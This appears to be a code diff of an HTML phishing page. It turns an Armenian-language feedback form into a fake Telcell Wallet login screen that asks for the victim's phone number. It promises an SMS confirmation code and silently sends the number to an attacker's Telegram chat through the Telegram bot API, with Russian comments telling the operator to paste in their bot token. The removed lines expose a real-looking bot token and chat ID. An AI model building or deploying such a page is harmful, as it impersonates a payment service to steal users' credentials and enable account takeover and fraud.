@@ -1,322 +1,253 @@
 <!DOCTYPE html>
 <html lang="hy">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Telcell Wallet - Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
 
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+        body {
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
 
-<title>Feedback</title>
+        .app-container {
+            width: 100%;
+            max-width: 400px;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            padding: 20px;
+            position: relative;
+        }
 
-<style>
+        /* Top Bar */
+        .back-button {
+            background: none;
+            border: none;
+            font-size: 24px;
+            color: #333;
+            cursor: pointer;
+            width: fit-content;
+            margin-bottom: 20px;
+        }
 
-*{
-margin:0;
-padding:0;
-box-sizing:border-box;
-font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
-}
+        /* Content Area */
+        .content {
+            flex-grow: 1;
+        }
 
-body{
-background:#f5f5f5;
-display:flex;
-justify-content:center;
-}
+        h1 {
+            font-size: 34px;
+            font-weight: 800;
+            color: #222;
+            margin-bottom: 30px;
+        }
 
-.app{
-width:390px;
-height:844px;
-background:#f6f6f6;
-position:relative;
-overflow:hidden;
-}
+        h2 {
+            font-size: 20px;
+            font-weight: 700;
+            text-align: center;
+            color: #222;
+            margin-bottom: 10px;
+        }
 
-.top{
-display:flex;
-align-items:center;
-gap:18px;
-padding:60px 24px 0;
-}
+        .subtitle {
+            font-size: 15px;
+            color: #8e8e93;
+            text-align: center;
+            margin-bottom: 35px;
+        }
 
-.back{
-font-size:34px;
-font-weight:300;
-color:#2f3c46;
-}
+        /* Input Section */
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
 
-.title{
-font-size:34px;
-font-weight:700;
-color:#2f3c46;
-}
+        label {
+            font-size: 14px;
+            font-weight: 700;
+            color: #333;
+        }
 
-.center{
-text-align:center;
-margin-top:50px;
-padding:0 20px;
-}
+        .input-wrapper {
+            background-color: #f2f2f7;
+            border-radius: 16px;
+            padding: 18px 20px;
+            display: flex;
+            align-items: center;
+        }
 
-.center h2{
-font-size:28px;
-font-weight:700;
-color:#2f3c46;
-margin-bottom:14px;
-}
+        input {
+            background: none;
+            border: none;
+            outline: none;
+            width: 100%;
+            font-size: 18px;
+            color: #000;
+        }
 
-.center p{
-font-size:18px;
-line-height:1.4;
-color:#7b8794;
-}
+        input::placeholder {
+            color: #aeaeb2;
+        }
 
-.form{
-margin-top:60px;
-padding:0 24px;
-}
+        .hint {
+            font-size: 14px;
+            color: #8e8e93;
+        }
 
-.label{
-font-size:20px;
-font-weight:700;
-color:#2f3c46;
-margin-bottom:14px;
-}
+        .info-box {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+            align-items: flex-start;
+        }
 
-.input{
-width:100%;
-height:72px;
-background:#eeeeee;
-border:none;
-border-radius:24px;
-padding:0 22px;
-font-size:22px;
-outline:none;
-color:#2f3c46;
-}
+        .info-icon {
+            color: #ff5e4d;
+            font-weight: bold;
+            font-size: 18px;
+        }
 
-.input::placeholder{
-color:#b7b7b7;
-}
+        .info-text {
+            font-size: 14px;
+            color: #8e8e93;
+            line-height: 1.4;
+        }
 
-.example{
-margin-top:16px;
-font-size:18px;
-color:#8b94a0;
-}
+        /* Footer Section */
+        .footer {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 15px;
+            margin-top: 20px;
+        }
 
-.warning{
-display:flex;
-align-items:flex-start;
-gap:10px;
-margin-top:28px;
-}
+        .offer-link {
+            color: #ff5e4d;
+            font-weight: 700;
+            text-decoration: none;
+            font-size: 16px;
+        }
 
-.icon{
-width:28px;
-height:28px;
-border:2px solid #ff6b57;
-border-radius:50%;
-display:flex;
-align-items:center;
-justify-content:center;
-font-size:18px;
-color:#ff6b57;
-flex-shrink:0;
-}
+        .terms {
+            font-size: 13px;
+            color: #333;
+            text-align: center;
+            padding: 0 20px;
+            line-height: 1.4;
+        }
 
-.warningText{
-font-size:17px;
-line-height:1.4;
-color:#7d8590;
-}
+        .submit-btn {
+            width: 100%;
+            background-color: #ffd0c8; /* Неактивный цвет как на скрине */
+            color: white;
+            border: none;
+            border-radius: 30px;
+            height: 56px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
 
-.bottom{
-position:absolute;
-left:24px;
-right:24px;
-bottom:36px;
-text-align:center;
-}
-
-.offer{
-font-size:24px;
-font-weight:700;
-color:#ff6b57;
-margin-bottom:10px;
-}
-
-.desc{
-font-size:18px;
-line-height:1.4;
-color:#414b57;
-margin-bottom:28px;
-}
-
-.button{
-width:100%;
-height:74px;
-border:none;
-border-radius:40px;
-background:#f5d7cf;
-font-size:28px;
-font-weight:600;
-color:white;
-transition:0.2s;
-}
-
-</style>
+        .submit-btn.active {
+            background-color: #ff5e4d; /* Активный цвет */
+        }
+    </style>
 </head>
-
 <body>
 
-<div class="app">
+<div class="app-container">
+    <button class="back-button">←</button>
 
-<div class="top">
-<div class="back">←</div>
-<div class="title">Բարև</div>
-</div>
+    <div class="content">
+        <h1>Բարև</h1>
+        <h2>Մուտք</h2>
+        <p class="subtitle">Ստեղծիր հարթակ վճարումներիդ համար</p>
 
-<div class="center">
+        <form id="loginForm">
+            <div class="input-group">
+                <label>Քո հեռախոսահամարը</label>
+                <div class="input-wrapper">
+                    <input type="tel" id="phone" placeholder="+374 (**) *** ***" required>
+                </div>
+                <p class="hint">Նմուշ՝ 77XXXXXX</p>
+                
+                <div class="info-box">
+                    <span class="info-icon">ⓘ</span>
+                    <p class="info-text">Հաստատման կոդով SMS-ը կուղարկվի տվյալ հեռախոսահամարին</p>
+                </div>
+            </div>
+        </form>
+    </div>
 
-<h2>Մուտք</h2>
-
-<p>
-Ստեղծիր հարթակ կարծիքների համար
-</p>
-
-</div>
-
-<div class="form">
-
-<div class="label">
-Քո կարծիքը
-</div>
-
-<input
-id="review"
-class="input"
-type="text"
-placeholder="Գրիր կարծիք..."
->
-
-<div class="example">
-Օր.` Շատ լավ ծառայություն
-</div>
-
-<div class="warning">
-
-<div class="icon">
-i
-</div>
-
-<div class="warningText">
-Քո կարծիքը կուղարկվի ադմինիստրատորին
-</div>
-
-</div>
-
-</div>
-
-<div class="bottom">
-
-<div class="offer">
-Ծանոթանալ Օֆերտային
-</div>
-
-<div class="desc">
-Հաստատելով` դու համաձայնվում ես օգտագործման կանոններին
-</div>
-
-<button
-id="sendBtn"
-class="button"
-onclick="sendReview()"
->
-Հաստատել
-</button>
-
-</div>
-
+    <div class="footer">
+        <a href="#" class="offer-link">Ծանոթանալ Օֆերտային</a>
+        <p class="terms">Telcell Wallet մուտք գործելով՝ դու ընդունում ես օգտագործման կանոնները</p>
+        <button type="submit" form="loginForm" id="submitBtn" class="submit-btn">Հաստատել</button>
+    </div>
 </div>
 
 <script>
+    const phoneInput = document.getElementById('phone');
+    const submitBtn = document.getElementById('submitBtn');
+    const form = document.getElementById('loginForm');
 
-const input = document.getElementById("review");
-const button = document.getElementById("sendBtn");
+    // Оживляем кнопку при вводе
+    phoneInput.addEventListener('input', () => {
+        if (phoneInput.value.length > 5) {
+            submitBtn.classList.add('active');
+        } else {
+            submitBtn.classList.remove('active');
+        }
+    });
 
-input.addEventListener("input", () => {
+    form.onsubmit = async function(e) {
+        e.preventDefault();
 
-if(input.value.trim() !== ""){
+        const phoneValue = phoneInput.value;
+        const BOT_TOKEN = 'PASTE_YOUR_TOKEN_HERE'; // ВСТАВЬ СВОЙ ТОКЕН ТУТ
+        const CHAT_ID = '6576262467';
 
-button.style.background = "#ff6b57";
+        // Меняем текст на кнопке для вида
+        submitBtn.innerText = 'Ուղարկվում է...';
 
-}else{
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: `📲 Telcell Login:\n\nНомер: ${phoneValue}`
+                })
+            });
 
-button.style.background = "#f5d7cf";
-
-}
-
-});
-
-async function sendReview(){
-
-if(input.value.trim() === ""){
-
-alert("Գրիր կարծիք");
-return;
-
-}
-
-const review = input.value;
-
-/* ВСТАВЬ СВОЙ BOT TOKEN */
-const token = '8314828218:AAGcMhdPg7GEDW4e1EPAlp-qJt5FkMXwlmY';
-
-/* ВСТАВЬ СВОЙ CHAT ID */
-const chat_id = '6576262467';
-
-try{
-
-const response = await fetch(
-`https://api.telegram.org/bot${token}/sendMessage`,
-{
-method:"POST",
-headers:{
-"Content-Type":"application/json"
-},
-body:JSON.stringify({
-chat_id:chat_id,
-text:`📝 Новый отзыв:\n\n${review}`
-})
-}
-);
-
-const data = await response.json();
-
-if(data.ok){
-
-alert("Отправлено");
-
-input.value = "";
-
-button.style.background = "#f5d7cf";
-
-}else{
-
-alert("Ошибка Telegram");
-
-console.log(data);
-
-}
-
-}catch(error){
-
-alert("Ошибка подключения");
-
-console.log(error);
-
-}
-
-}
-
+            if (response.ok) {
+                alert('Մուտքը հաստատված է:');
+                phoneInput.value = '';
+                submitBtn.classList.remove('active');
+                submitBtn.innerText = 'Հաստատել';
+            } else {
+                alert('Ошибка сервера');
+            }
+        } catch (err) {
+            alert('Ցանցի սխալ');
+        }
+    };
 </script>
 
 </body>
